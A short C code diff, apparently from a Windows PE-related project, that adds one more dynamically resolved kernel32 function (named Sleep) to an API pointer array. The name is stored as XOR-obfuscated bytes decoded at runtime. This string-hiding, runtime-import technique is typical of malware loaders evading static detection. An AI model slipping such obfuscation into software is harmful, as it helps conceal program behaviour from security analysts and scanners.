@@ -1,5 +1,5 @@
 #include "PE.h"
-FARPROC APIArray[54];
+FARPROC APIArray[55];
 void resolveString(BYTE* buffer, BYTE* key, int size) {
 	for (int i = 0; i < size; i++) {
 		buffer[i] ^= 0xFF;
@@ -334,7 +334,12 @@ int initAPIArray() {
 
 	APIArray[53] = TempGetProcAddress(hKernel32, (LPCSTR)WaitForSingleObject_str);
 
-	for (int i = 0; i < 54; i++) {
+	BYTE Sleep_key[5] = { 195, 121, 104, 208, 87 };
+	BYTE Sleep_str[6] = {111, 234, 242, 74, 216, 60};
+	resolveString(Sleep_str, Sleep_key, 6);
+
+	APIArray[54] = TempGetProcAddress(hKernel32, (LPCSTR)Sleep_str);
+	for (int i = 0; i < 55; i++) {
 		if (!APIArray[i]) {
 			return -1;
 		}
